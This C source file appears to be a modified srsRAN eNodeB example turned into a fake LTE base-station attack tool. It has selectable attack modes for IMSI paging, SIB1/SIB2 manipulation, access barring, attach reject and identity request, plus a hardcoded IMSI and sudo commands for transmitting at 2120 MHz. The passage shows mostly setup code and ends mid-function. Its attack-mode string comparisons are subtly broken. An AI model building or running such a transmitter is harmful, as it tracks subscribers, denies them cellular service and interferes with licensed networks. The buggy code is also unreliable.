/**
 * Copyright 2013-2022 Software Radio Systems Limited
 *
 * This file is part of srsRAN.
 *
 * srsRAN is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * srsRAN is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * A copy of the GNU Affero General Public License can be found in
 * the LICENSE file in the top-level directory of this distribution
 * and at http://www.gnu.org/licenses/.
 *
 */

 #include "srsran/common/crash_handler.h"
 #include "srsran/common/gen_mch_tables.h"
 #include "srsran/srsran.h"
 #include <getopt.h>
 #include <pthread.h>
 #include <semaphore.h>
 #include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <strings.h>
 #include <sys/select.h>
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <dirent.h>
 #include <sys/stat.h>
 #include <errno.h>
 #define UE_CRNTI 0xFFFF
 #define M_CRNTI 0xFFFD
 
 #ifndef DISABLE_RF
 #include "srsran/phy/common/phy_common.h"
 #include "srsran/phy/rf/rf.h"
 #include "srsran/phy/rf/rf_utils.h"
 
 srsran_rf_t radio;
 #else
 #pragma message "Compiling pdsch_ue with no RF support"
 #endif
 
 static char* output_file_name = NULL;
 
 #define LEFT_KEY 68
 #define RIGHT_KEY 67
 #define UP_KEY 65
 #define DOWN_KEY 66
 #define PAGE_UP 53
 #define PAGE_DOWN 54
 
 #define CFR_THRES_UP_KEY 't'
 #define CFR_THRES_DN_KEY 'g'
 
 #define CFR_THRES_STEP 0.05f
 #define CFR_PAPR_STEP 0.1f
 
 bool paging_msg = false;
 bool sib1_msg = false;
 bool sib2_msg = false;
 bool po_msg = false;
 bool ar_msg = false;
 bool ir_msg = false;

 static cell_search_cfg_t cell_detect_config = {.max_frames_pbch      = SRSRAN_DEFAULT_MAX_FRAMES_PBCH,
                                         .max_frames_pss       = SRSRAN_DEFAULT_MAX_FRAMES_PSS,
                                         .nof_valid_pss_frames = SRSRAN_DEFAULT_NOF_VALID_PSS_FRAMES,
                                         .init_agc             = 0,
                                         .force_tdd            = false};
 
 static srsran_ue_sync_t ue_sync;
 static cf_t* sf_buffer_sync[SRSRAN_MAX_PORTS] = {NULL};
 static cf_t* paging_buffer[SRSRAN_MAX_PORTS] = {NULL};
 static cf_t* sib1_buffer[SRSRAN_MAX_PORTS] = {NULL};
 static cf_t* sib2_buffer[SRSRAN_MAX_PORTS] = {NULL};
 static cf_t* po_buffer[SRSRAN_MAX_PORTS] = {NULL};
 static cf_t* ar_buffer[SRSRAN_MAX_PORTS] = {NULL};
 static cf_t* ir_buffer[SRSRAN_MAX_PORTS] = {NULL};

 
 // 存储输入的文件名
 static char* paging_file = "output_paging_sysinfmod";
 static char* sib1_file = "output_sib1_sysinfvaltag";
 static char* sib2_file = "output_sib2_acbarring";
 static char* po_file = "output_po";
 static char* ar_file = "output_attach_reject";
 static char* ir_file = "output_identity_request";


 char* imsi  = "460017837217696";
 char* attack_mode;
 
 static uint32_t max_num_samples;
 static srsran_ue_mib_t ue_mib;
 static srsran_ue_dl_t ue_dl;
 
 static srsran_ue_dl_cfg_t ue_dl_cfg;
 static srsran_dl_sf_cfg_t dl_sf;
 static srsran_chest_dl_cfg_t chest_pdsch_cfg = {};
 
 static pthread_t tx_thread;
 static pthread_t rx_thread;
 static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER; 
 static pthread_cond_t cond  = PTHREAD_COND_INITIALIZER;
 static srsran_timestamp_t last_stamp;
 
 static int rx_ret = -1;
 static bool updated = false;
 static uint32_t sfn;
 static int sf_idx;
 
 static srsran_cell_t cell = {};
 
 static int      net_port = -1; // -1 generates random dataThat means there is some problem sending samples to the device
 static uint32_t cfi      = 1;
 static uint32_t mcs_idx = 1, last_mcs_idx = 1;
 static int      nof_frames              = -1;
 static srsran_tm_t transmission_mode    = SRSRAN_TM1;
 static uint32_t    nof_tb               = 1;
 static uint32_t    multiplex_pmi        = 0;
 static uint32_t    multiplex_nof_layers = 1;
 static uint8_t     mbsfn_sf_mask        = 32;
 static int         mbsfn_area_id        = -1;
 static char*       rf_args              = "";
 static char*       rf_dev               = "";
 static float       rf_amp = 0.8, rf_gain = 15.0, rf_freq = 2400000000;
 static bool        enable_256qam         = false;
 static float       output_file_snr       = +INFINITY;
 static bool        use_standard_lte_rate = false;
 
 
 // CFR runtime control flags
 static bool cfr_thr_inc = false;
 static bool cfr_thr_dec = false;
 
 typedef struct {
   int   enable;
   char* mode;
   float manual_thres;
   float strength;
   float auto_target_papr;
   float ema_alpha;
 } cfr_args_t;
 
 static cfr_args_t cfr_args = {.enable           = 0,
                               .mode             = "manual",
                               .manual_thres     = 1.0f,
                               .strength         = 1.0f,
                               .auto_target_papr = 8.0f,
                               .ema_alpha        = 1.0f / (float)SRSRAN_CP_NORM_NSYMB};
 
 static bool                    null_file_sink = false;
 static srsran_filesink_t       fsink;
 static srsran_ofdm_t           ifft[SRSRAN_MAX_PORTS];
 static srsran_ofdm_t           ifft_mbsfn;
 static srsran_pbch_t           pbch;
 static srsran_pcfich_t         pcfich;
 static srsran_pdcch_t          pdcch;
 static srsran_pdsch_t          pdsch;
 static srsran_pdsch_cfg_t      pdsch_cfg;
 static srsran_pmch_t           pmch;
 static srsran_pmch_cfg_t       pmch_cfg;
 static srsran_softbuffer_tx_t* softbuffers[SRSRAN_MAX_CODEWORDS];
 static srsran_regs_t           regs;
 static srsran_dci_dl_t         dci_dl;
 static int                     rvidx[SRSRAN_MAX_CODEWORDS] = {0, 0};
 static srsran_cfr_cfg_t        cfr_config                  = {};
 
 static cf_t *   sf_buffer[SRSRAN_MAX_PORTS] = {NULL}, *output_buffer[SRSRAN_MAX_PORTS] = {NULL};
 static uint32_t sf_n_re, sf_n_samples;
 
 static pthread_t          net_thread;
 static void*              net_thread_fnc(void* arg);
 static sem_t              net_sem;
 static bool               net_packet_ready = false;
 static srsran_netsource_t net_source;
 static srsran_netsink_t   net_sink;
 
 static int prbset_num = 1, last_prbset_num = 1;
 static int prbset_orig = 0;
 
 #define DATA_BUFF_SZ 1024 * 1024
 static uint8_t *data_mbms, *data[2], data2[DATA_BUFF_SZ];
 static uint8_t  data_tmp[DATA_BUFF_SZ];
 
 static void usage(char* prog)
 {
   printf("Usage: %s [Iagmfoncvpuxb]\n", prog);
 #ifndef DISABLE_RF
   printf("\t-i <file1> <file2> <file3>\n");
   printf("\t  Input files. Can be 1 to 3 files, each containing either 'paging', 'sib1', or 'sib2' in the filename.\n");
   printf("\t  Defaults: paging_file = '%s', sib1_file = '%s', sib2_file = '%s'\n", paging_file, sib1_file, sib2_file);
     printf("\t-I RF device [Default %s]\n", rf_dev);
   printf("\t-a RF args [Default %s]\n", rf_args);
   printf("\t-l RF amplitude [Default %.2f]\n", rf_amp);
   printf("\t-g RF TX gain [Default %.2f dB]\n", rf_gain);
   printf("\t-f RF TX frequency [Default %.1f MHz]\n", rf_freq / 1000000);
 #else
   printf("\t   RF is disabled.\n");
 #endif
   printf("\t-o output_file [Default use RF board]\n");
   printf("\t-m MCS index [Default %d]\n", mcs_idx);
   printf("\t-n number of frames [Default %d]\n", nof_frames);
   printf("\t-c cell id [Default %d]\n", cell.id);
   printf("\t-p nof_prb [Default %d]\n", cell.nof_prb);
   printf("\t-M MBSFN area id [Default %d]\n", mbsfn_area_id);
   printf("\t-x Transmission mode [1-4] [Default %d]\n", transmission_mode + 1);
   printf("\t-b Precoding Matrix Index (multiplex mode only)* [Default %d]\n", multiplex_pmi);
   printf("\t-w Number of codewords/layers (multiplex mode only)* [Default %d]\n", multiplex_nof_layers);
   printf("\t-u listen TCP/UDP port for input data (if mbsfn is active then the stream is over mbsfn only) (-1 is "
          "random) [Default %d]\n",
          net_port);
   printf("\t-v [set srsran_verbose to debug, default none]\n");
   printf("\t-s output file SNR [Default %f]\n", output_file_snr);
   printf("\t-q Enable/Disable 256QAM modulation (default %s)\n", enable_256qam ? "enabled" : "disabled");
   printf("\t-Q Use standard LTE sample rates (default %s)\n", use_standard_lte_rate ? "enabled" : "disabled");
   printf("CFR Options:\n");
   printf("\t--enable_cfr       Enable the CFR (default %s)\n", cfr_args.enable ? "enabled" : "disabled");
   printf("\t--cfr_mode         CFR mode: manual, auto_cma, auto_ema. (default %s)\n", cfr_args.mode);
   printf("\t--cfr_manual_thres CFR manual threshold (default %.2f)\n", cfr_args.manual_thres);
   printf("\t--cfr_strength     CFR strength (default %.2f)\n", cfr_args.strength);
   printf("\t--cfr_auto_papr    CFR PAPR target for auto modes (default %.2f)\n", cfr_args.auto_target_papr);
   printf("\t--cfr_ema_alpha    CFR alpha parameter for EMA mode (default %.2f)\n", cfr_args.ema_alpha);
   printf("\n");
   printf("\t*: See 3GPP 36.212 Table  5.3.3.1.5-4 for more information\n");
   //例子
   printf("\nExample:\n");
 
   printf("\tpaging_systeminfomodification: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_paging_sysinfmod\n");
   printf("\tpaging_imsi: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_paging_imsi\n");
   printf("\tsib1_systeminfovaluetag: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_sib1_sysinfvaltag\n");
   printf("\tsib1_tac: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_sib1_tac\n");
   printf("\tsib2_acbarring: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_sib2_acbarring\n");
 }
 struct option cfr_opts[] = {{"enable_cfr", no_argument, &cfr_args.enable, 1},
                             {"cfr_mode", required_argument, NULL, 'C'},
                             {"cfr_manual_thres", required_argument, NULL, 'T'},
                             {"cfr_strength", required_argument, NULL, 'S'},
                             {"cfr_auto_papr", required_argument, NULL, 'P'},
                             {"cfr_ema_alpha", required_argument, NULL, 'e'},
                             {0, 0, 0, 0}};
 
 static void parse_args(int argc, char** argv)
{
    int opt;
    while ((opt = getopt_long(argc, argv, "hi:I:a:g:l:f:o:m:u:n:p:c:x:b:w:M:v:s:B:q:Q:E:C:T:S:P:e:t:", cfr_opts, NULL)) != -1) {
        switch (opt) {
            case 'h':
                usage(argv[0]);
                exit(-1);
            case 'I':
                rf_dev = argv[optind-1];
                break;
            case 'a':
                rf_args = optarg;
                break;
            case 'g':
                rf_gain = strtof(optarg, NULL);
                break;
            case 'l':
                rf_amp = strtof(optarg, NULL);
                break;
            case 'f':
                rf_freq = strtof(optarg, NULL);
                fprintf(stderr, "[WARN] -f is deprecated, frequency may be ignored.\n");
                break;
            case 'o':
                output_file_name = optarg;
                break;
            case 'm':
                mcs_idx = (uint32_t)strtol(optarg, NULL, 10);
                break;
            case 'u':
                net_port = (int)strtol(optarg, NULL, 10);
                break;
            case 'n':
                nof_frames = (int)strtol(optarg, NULL, 10);
                break;
            case 'p':
                cell.nof_prb = (uint32_t)strtol(optarg, NULL, 10);
                break;
            case 'c':
                cell.id = (int)strtol(optarg, NULL, 10);
                break;
            case 'x':
                transmission_mode = (srsran_tm_t)(strtol(optarg, NULL, 10) - 1);
                break;
            case 'b':
                multiplex_pmi = (uint32_t)strtol(optarg, NULL, 10);
                break;
            case 'w':
                multiplex_nof_layers = (uint32_t)strtol(optarg, NULL, 10);
                break;
            case 'M':
                mbsfn_area_id = (int)strtol(optarg, NULL, 10);
                break;
            case 'v':
                increase_srsran_verbose_level();
                break;
            case 's':
                output_file_snr = strtof(optarg, NULL);
                break;
            case 'B':
                mbsfn_sf_mask = (uint8_t)strtol(optarg, NULL, 10);
                break;
            case 'q':
                enable_256qam ^= true;
                break;
            case 'Q':
                use_standard_lte_rate ^= true;
                break;
            case 'E':
                cell.cp = SRSRAN_CP_EXT;
                break;
            case 'C':
                cfr_args.mode = optarg;
                break;
            case 'T':
                cfr_args.manual_thres = strtof(optarg, NULL);
                break;
            case 'S':
                cfr_args.strength = strtof(optarg, NULL);
                break;
            case 'P':
                cfr_args.auto_target_papr = strtof(optarg, NULL);
                break;
            case 'e':
                cfr_args.ema_alpha = strtof(optarg, NULL);
                break;
            case 't': {
              attack_mode = optarg;
                if (attack_mode == "paging_imsi") {
                    paging_msg = true;
                }
                else if (attack_mode == "sib1_tac") {
                    sib1_msg = true;
                    paging_msg = true;
                }
                else if (attack_mode == "sib2_acbarring") {
                    sib2_msg = true;
                    paging_msg = true;
                }
                else if (attack_mode == "pdcch_order") {
                    po_msg = true;
                }
                else if (attack_mode == "attach_reject") {
                    ar_msg = true;
                }
                else if (attack_mode == "identity_request") {
                    ir_msg = true;
                }
                else {
                    fprintf(stderr, "[ERROR] Unknown --type: %s\n", attack_mode);
                    usage(argv[0]);
                    exit(-1);
                }
                break;
            }
            case 0:
                break;
            default:
                usage(argv[0]);
                exit(-1);
        }
    }

#ifdef DISABLE_RF
    if (!output_file_name) {
        usage(argv[0]);
        exit(-1);
    }
#endif
}
 static int parse_cfr_args()
 {
   cfr_config.cfr_enable  = cfr_args.enable;
   cfr_config.manual_thr  = cfr_args.manual_thres;
   cfr_config.max_papr_db = cfr_args.auto_target_papr;
   cfr_config.alpha       = cfr_args.strength;
   cfr_config.ema_alpha   = cfr_args.ema_alpha;
 
   cfr_config.cfr_mode = srsran_cfr_str2mode(cfr_args.mode);
   if (cfr_config.cfr_mode == SRSRAN_CFR_THR_INVALID) {
     ERROR("CFR mode not recognised");
     return SRSRAN_ERROR;
   }
 
   if (!srsran_cfr_params_valid(&cfr_config)) {
     ERROR("Invalid CFR parameters");
     return SRSRAN_ERROR;
   }
   return SRSRAN_SUCCESS;
 }
 
 static void base_init()
 {
   int i; 
   switch (transmission_mode) {
     case SRSRAN_TM1:
       cell.nof_ports = 1;
       break;
     case SRSRAN_TM2:
     case SRSRAN_TM3:
     case SRSRAN_TM4:
       cell.nof_ports = 2;
       break;
     default:
       ERROR("Transmission mode %d not implemented or invalid", transmission_mode);
       exit(-1);
   }
   for (i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
     data[i] = srsran_vec_u8_malloc(SOFTBUFFER_SIZE);
     if (!data[i]) {
       perror("malloc");
       exit(-1);
     }
     bzero(data[i], sizeof(uint8_t) * SOFTBUFFER_SIZE);
   }
   data_mbms = srsran_vec_u8_malloc(SOFTBUFFER_SIZE);
 
   /* init memory */
   for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
     sf_buffer[i] = srsran_vec_cf_malloc(sf_n_re);
     if (!sf_buffer[i]) {
       perror("malloc");
       exit(-1);
     }
   }
 
   for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
     output_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
     if (!output_buffer[i]) {
       perror("malloc");
       exit(-1);
     }
     srsran_vec_cf_zero(output_buffer[i], sf_n_samples);
   }
 
   for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
     paging_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
     //printf("test yg 1230 sf_n_samples:%d\n", sf_n_samples);
     if (!paging_buffer[i]) {
       perror("malloc");
       exit(-1);
     }
     srsran_vec_cf_zero(paging_buffer[i], sf_n_samples);
 
     sib1_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
     if (!sib1_buffer[i]) {
       perror("malloc");
       exit(-1);
     }
     srsran_vec_cf_zero(sib1_buffer[i], sf_n_samples);
 
     sib2_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
     if (!sib2_buffer[i]) {
       perror("malloc");
       exit(-1);
     }
     srsran_vec_cf_zero(sib2_buffer[i], sf_n_samples);

     po_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
     if (!po_buffer[i]) {
       perror("malloc");
       exit(-1);
     }
     srsran_vec_cf_zero(po_buffer[i], sf_n_samples);

     ar_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
     if (!ar_buffer[i]) {
       perror("malloc");
       exit(-1);
     }
     srsran_vec_cf_zero(ar_buffer[i], sf_n_samples);

     ir_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
     if (!ir_buffer[i]) {
       perror("malloc");
       exit(-1);
     }
     srsran_vec_cf_zero(ir_buffer[i], sf_n_samples);
   }
 
   /* open file or USRP */
   if (output_file_name) {
     if (strcmp(output_file_name, "NULL")) {
       if (srsran_filesink_init(&fsink, output_file_name, SRSRAN_COMPLEX_FLOAT_BIN)) {
         ERROR("Error opening file %s", output_file_name);
         exit(-1);
       }
       null_file_sink = false;
     } else {
       null_file_sink = true;
     }
   } else {
 #ifndef DISABLE_RF
     printf("Opening RF device...\n");    
     // test yg 1023
     //printf("test 1023 nof_ports:%d\n", cell.nof_ports);
     if (srsran_rf_open_devname(&radio, rf_dev, rf_args, cell.nof_ports)) {
       fprintf(stderr, "Error opening rf\n");
       exit(-1);
     }
 #else
     printf("Error RF not available. Select an output file\n");
     exit(-1);
 #endif
   }
 
   if (net_port > 0) {
     if (srsran_netsource_init(&net_source, "127.0.0.1", net_port, SRSRAN_NETSOURCE_UDP)) {
       ERROR("Error creating input UDP socket at port %d", net_port);
       exit(-1);
     }
     if (null_file_sink) {
       if (srsran_netsink_init(&net_sink, "127.0.0.1", net_port + 1, SRSRAN_NETSINK_TCP)) {
         ERROR("Error sink");
         exit(-1);
       }
     }
     if (sem_init(&net_sem, 0, 1)) {
       perror("sem_init");
       exit(-1);
     }
   }
 
   /* create ifft object */
   for (i = 0; i < cell.nof_ports; i++) {
     if (srsran_ofdm_tx_init(&ifft[i], cell.cp, sf_buffer[i], output_buffer[i], cell.nof_prb)) {
       ERROR("Error creating iFFT object");
       exit(-1);
     }
 
     srsran_ofdm_set_normalize(&ifft[i], true);
     if (srsran_ofdm_set_cfr(&ifft[i], &cfr_config)) {
       ERROR("Error setting CFR object");
       exit(-1);
     }
   }
 
   if (srsran_ofdm_tx_init_mbsfn(&ifft_mbsfn, SRSRAN_CP_EXT, sf_buffer[0], output_buffer[0], cell.nof_prb)) {
     ERROR("Error creating iFFT object");
     exit(-1);
   }
   srsran_ofdm_set_non_mbsfn_region(&ifft_mbsfn, 2);
   srsran_ofdm_set_normalize(&ifft_mbsfn, true);
   if (srsran_ofdm_set_cfr(&ifft_mbsfn, &cfr_config)) {
     ERROR("Error setting CFR object");
     exit(-1);
   }
 
   if (srsran_pbch_init(&pbch)) {
     ERROR("Error creating PBCH object");
     exit(-1);
   }
   if (srsran_pbch_set_cell(&pbch, cell)) {
     ERROR("Error creating PBCH object");
     exit(-1);
   }
 
   if (srsran_regs_init(&regs, cell)) {
     ERROR("Error initiating regs");
     exit(-1);
   }
   if (srsran_pcfich_init(&pcfich, 1)) {
     ERROR("Error creating PBCH object");
     exit(-1);
   }
   if (srsran_pcfich_set_cell(&pcfich, &regs, cell)) {
     ERROR("Error creating PBCH object");
     exit(-1);
   }
 
   if (srsran_pdcch_init_enb(&pdcch, cell.nof_prb)) {
     ERROR("Error creating PDCCH object");
     exit(-1);
   }
   if (srsran_pdcch_set_cell(&pdcch, &regs, cell)) {
     ERROR("Error creating PDCCH object");
     exit(-1);
   }
 
   if (srsran_pdsch_init_enb(&pdsch, cell.nof_prb)) {
     ERROR("Error creating PDSCH object");
     exit(-1);
   }
   if (srsran_pdsch_set_cell(&pdsch, cell)) {
     ERROR("Error creating PDSCH object");
     exit(-1);
   }
 
   if (mbsfn_area_id > -1) {
     if (srsran_pmch_init(&pmch, cell.nof_prb, 1)) {
       ERROR("Error creating PMCH object");
     }
     srsran_pmch_set_area_id(&pmch, mbsfn_area_id);
   }
 
   for (i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
     softbuffers[i] = calloc(sizeof(srsran_softbuffer_tx_t), 1);
     if (!softbuffers[i]) {
       ERROR("Error allocating soft buffer");
       exit(-1);
     }
 
     if (srsran_softbuffer_tx_init(softbuffers[i], cell.nof_prb)) {
       ERROR("Error initiating soft buffer");
       exit(-1);
     }
   }
 }
 
 static void base_free()
 {
   int i;
   for (i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
     srsran_softbuffer_tx_free(softbuffers[i]);
     if (softbuffers[i]) {
       free(softbuffers[i]);
     }
   }
   srsran_pdsch_free(&pdsch);
   srsran_pdcch_free(&pdcch);
   srsran_regs_free(&regs);
   srsran_pbch_free(&pbch);
   if (mbsfn_area_id > -1) {
     srsran_pmch_free(&pmch);
   }
   srsran_ofdm_tx_free(&ifft_mbsfn);
   for (i = 0; i < cell.nof_ports; i++) {
     srsran_ofdm_tx_free(&ifft[i]);
   }
 
   for (i = 0; i < SRSRAN_MAX_CODEWORDS; i++) {
     if (data[i]) {
       free(data[i]);
     }
   }
 
   for (i = 0; i < SRSRAN_MAX_PORTS; i++) {
     if (sf_buffer[i]) {
       free(sf_buffer[i]);
     }
 
     if (output_buffer[i]) {
       free(output_buffer[i]);
     }
     if (sf_buffer_sync[i]) {
       free(sf_buffer_sync[i]);
     }
     if (paging_buffer[i]) {
       free(paging_buffer[i]);
     }
     if (sib1_buffer[i]) {
       free(sib1_buffer[i]);
     }
     if (sib2_buffer[i]) {
       free(sib2_buffer[i]);
     }
     if (po_buffer[i]) {
      free(po_buffer[i]);
    }
    if (ar_buffer[i]) {
      free(ar_buffer[i]);
    }
    if (ir_buffer[i]) {
      free(ir_buffer[i]);
    }
   }
   if (output_file_name) {
     if (!null_file_sink) {
       srsran_filesink_free(&fsink);
     }
   } else {
 #ifndef DISABLE_RF
     srsran_rf_close(&radio);
 #endif
   }
 
   if (net_port > 0) {
     srsran_netsource_free(&net_source);
     sem_close(&net_sem);
   }
 }
 
 bool go_exit = false;
 #ifndef DISABLE_RF
 static void sig_int_handler(int signo)
 {
   printf("SIGINT received. Exiting...\n");
   if (signo == SIGINT) {
     go_exit = true;
     updated = true;
     pthread_cond_signal(&cond);
   }
 }
 #endif /* DISABLE_RF */
 
 static unsigned int reverse(register unsigned int x)
 {
   x = (((x & 0xaaaaaaaa) >> 1) | ((x & 0x55555555) << 1));
   x = (((x & 0xcccccccc) >> 2) | ((x & 0x33333333) << 2));
   x = (((x & 0xf0f0f0f0) >> 4) | ((x & 0x0f0f0f0f) << 4));
   x = (((x & 0xff00ff00) >> 8) | ((x & 0x00ff00ff) << 8));
   return ((x >> 16) | (x << 16));
 }
 
 static uint32_t prbset_to_bitmask()
 {
   uint32_t mask = 0;
   int      nb   = (int)ceilf((float)cell.nof_prb / srsran_ra_type0_P(cell.nof_prb));
   for (int i = 0; i < nb; i++) {
     if (i >= prbset_orig && i < prbset_orig + prbset_num) {
       mask = mask | (0x1 << i);
     }
   }
   return reverse(mask) >> (32 - nb);
 }
 
 static int update_radl()
 {
   ZERO_OBJECT(dci_dl);
 
   int ret = SRSRAN_ERROR;
 
   /* Configure cell and PDSCH in function of the transmission mode */
   switch (transmission_mode) {
     case SRSRAN_TM1:
     case SRSRAN_TM2:
       nof_tb        = 1;
       dci_dl.format = SRSRAN_DCI_FORMAT1;
       break;
     case SRSRAN_TM3:
       dci_dl.format = SRSRAN_DCI_FORMAT2A;
       nof_tb        = 2;
       break;
     case SRSRAN_TM4:
       dci_dl.format = SRSRAN_DCI_FORMAT2;
       nof_tb        = multiplex_nof_layers;
       if (multiplex_nof_layers == 1) {
         dci_dl.pinfo = (uint8_t)(multiplex_pmi + 1);
       } else {
         dci_dl.pinfo = (uint8_t)multiplex_pmi;
       }
       break;
     default:
       ERROR("Transmission mode not implemented.");
       goto exit;
   }
 
   dci_dl.rnti                    = UE_CRNTI;
   dci_dl.pid                     = 0;
   dci_dl.tb[0].mcs_idx           = mcs_idx;
   dci_dl.tb[0].ndi               = 0;
   dci_dl.tb[0].rv                = rvidx[0];
   dci_dl.tb[0].cw_idx            = 0;
   dci_dl.alloc_type              = SRSRAN_RA_ALLOC_TYPE0;
   dci_dl.type0_alloc.rbg_bitmask = prbset_to_bitmask();
 
   if (nof_tb > 1) {
     dci_dl.tb[1].mcs_idx = mcs_idx;
     dci_dl.tb[1].ndi     = 0;
     dci_dl.tb[1].rv      = rvidx[1];
     dci_dl.tb[1].cw_idx  = 1;
   } else {
     SRSRAN_DCI_TB_DISABLE(dci_dl.tb[1]);
   }
 
   // Increase the CFR threshold or target PAPR
   if (cfr_thr_inc) {
     cfr_thr_inc = false; // Reset the flag
     if (cfr_config.cfr_enable && cfr_config.cfr_mode == SRSRAN_CFR_THR_MANUAL) {
       cfr_config.manual_thr += CFR_THRES_STEP;
       for (int i = 0; i < cell.nof_ports; i++) {
         if (srsran_cfr_set_threshold(&ifft[i].tx_cfr, cfr_config.manual_thr) < SRSRAN_SUCCESS) {
           ERROR("Setting the CFR");
           goto exit;
         }
       }
       if (srsran_cfr_set_threshold(&ifft_mbsfn.tx_cfr, cfr_config.manual_thr) < SRSRAN_SUCCESS) {
         ERROR("Setting the CFR");
         goto exit;
       }
       printf("CFR Thres. set to %.3f\n", cfr_config.manual_thr);
     } else if (cfr_config.cfr_enable && cfr_config.cfr_mode != SRSRAN_CFR_THR_MANUAL) {
       cfr_config.max_papr_db += CFR_PAPR_STEP;
       for (int i = 0; i < cell.nof_ports; i++) {
         if (srsran_cfr_set_papr(&ifft[i].tx_cfr, cfr_config.max_papr_db) < SRSRAN_SUCCESS) {
           ERROR("Setting the CFR");
           goto exit;
         }
       }
       if (srsran_cfr_set_papr(&ifft_mbsfn.tx_cfr, cfr_config.max_papr_db) < SRSRAN_SUCCESS) {
         ERROR("Setting the CFR");
         goto exit;
       }
       printf("CFR target PAPR set to %.3f\n", cfr_config.max_papr_db);
     }
   }
 
   // Decrease the CFR threshold or target PAPR
   if (cfr_thr_dec) {
     cfr_thr_dec = false; // Reset the flag
     if (cfr_config.cfr_enable && cfr_config.cfr_mode == SRSRAN_CFR_THR_MANUAL) {
       if (cfr_config.manual_thr - CFR_THRES_STEP >= 0) {
         cfr_config.manual_thr -= CFR_THRES_STEP;
         for (int i = 0; i < cell.nof_ports; i++) {
           if (srsran_cfr_set_threshold(&ifft[i].tx_cfr, cfr_config.manual_thr) < SRSRAN_SUCCESS) {
             ERROR("Setting the CFR");
             goto exit;
           }
         }
         if (srsran_cfr_set_threshold(&ifft_mbsfn.tx_cfr, cfr_config.manual_thr) < SRSRAN_SUCCESS) {
           ERROR("Setting the CFR");
           goto exit;
         }
         printf("CFR Thres. set to %.3f\n", cfr_config.manual_thr);
       }
     } else if (cfr_config.cfr_enable && cfr_config.cfr_mode != SRSRAN_CFR_THR_MANUAL) {
       if (cfr_config.max_papr_db - CFR_PAPR_STEP >= 0) {
         cfr_config.max_papr_db -= CFR_PAPR_STEP;
         for (int i = 0; i < cell.nof_ports; i++) {
           if (srsran_cfr_set_papr(&ifft[i].tx_cfr, cfr_config.max_papr_db) < SRSRAN_SUCCESS) {
             ERROR("Setting the CFR");
             goto exit;
           }
         }
         if (srsran_cfr_set_papr(&ifft_mbsfn.tx_cfr, cfr_config.max_papr_db) < SRSRAN_SUCCESS) {
           ERROR("Setting the CFR");
           goto exit;
         }
         printf("CFR target PAPR set to %.3f\n", cfr_config.max_papr_db);
       }
     }
   }
 
   srsran_dci_dl_fprint(stdout, &dci_dl, cell.nof_prb);
   printf("\nCFR controls:\n");
   printf("    Param   | INC | DEC |\n");
   printf("------------+-----+-----+\n");
   printf(" Thres/PAPR |  %c  |  %c  |\n", CFR_THRES_UP_KEY, CFR_THRES_DN_KEY);
   printf("\n");
   if (transmission_mode != SRSRAN_TM1) {
     printf("\nTransmission mode key table:\n");
     printf("   Mode   |   1TB   | 2TB |\n");
     printf("----------+---------+-----+\n");
     printf("Diversity |    x    |     |\n");
     printf("      CDD |         |  z  |\n");
     printf("Multiplex | q,w,e,r | a,s |\n");
     printf("\n");
     printf("Type new MCS index (0-28) or cfr/mode key and press Enter: ");
   } else {
     printf("Type new MCS index (0-28) or cfr key and press Enter: ");
   }
   fflush(stdout);
   ret = SRSRAN_SUCCESS;
 
 exit:
   return ret;
 }
 
 /* Read new MCS from stdin */
 static int update_control()
 {
   char input[128];
 
   fd_set set;
   FD_ZERO(&set);
   FD_SET(0, &set);
 
   struct timeval to;
   to.tv_sec  = 0;
   to.tv_usec = 0;
 
   int n = select(1, &set, NULL, NULL, &to);
   if (n == 1) {
     // stdin ready
     if (fgets(input, sizeof(input), stdin)) {
       if (input[0] == 27) {
         switch (input[2]) {
           case RIGHT_KEY:
             if (prbset_orig + prbset_num < (int)ceilf((float)cell.nof_prb / srsran_ra_type0_P(cell.nof_prb)))
               prbset_orig++;
             break;
           case LEFT_KEY:
             if (prbset_orig > 0)
               prbset_orig--;
             break;
           case UP_KEY:
             if (prbset_num < (int)ceilf((float)cell.nof_prb / srsran_ra_type0_P(cell.nof_prb)))
               prbset_num++;
             break;
           case DOWN_KEY:
             last_prbset_num = prbset_num;
             if (prbset_num > 0)
               prbset_num--;
             break;
 #ifndef DISABLE_RF
           case PAGE_UP:
             if (!output_file_name) {
               rf_gain++;
               srsran_rf_set_tx_gain(&radio, rf_gain);
               //printf("test yg 1025 line 868 Set TX gain: %.1f dB\n", srsran_rf_get_tx_gain(&radio));
             }
             break;
           case PAGE_DOWN:
             if (!output_file_name) {
               rf_gain--;
               srsran_rf_set_tx_gain(&radio, rf_gain);
